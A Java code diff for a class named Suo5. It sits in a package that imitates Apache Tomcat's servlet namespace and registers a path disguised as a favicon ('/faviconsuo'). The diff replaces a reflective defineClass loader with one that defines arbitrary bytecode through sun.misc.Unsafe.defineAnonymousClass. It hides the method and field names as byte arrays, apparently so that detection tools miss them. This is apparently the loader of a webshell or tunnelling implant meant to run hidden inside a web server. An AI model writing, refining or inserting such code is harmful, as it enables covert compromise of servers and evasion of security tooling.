@@ -1,15 +1,19 @@
 package org.apache.catalina.servlets.sl;
 
 
+import java.nio.charset.StandardCharsets;
+import java.util.Arrays;
 
 public class Suo5 {
     private static final String pathPattern= "/faviconsuo";
 
     public static Class loader(byte[] bytes) throws Exception {
-        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
-        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});
-        method.setAccessible(true);
-        Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
+        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
+        field.setAccessible(true);
+        Object unsafe = field.get(null);
+        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
+        m.setAccessible(true);
+        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
         return clazz;
     }
 
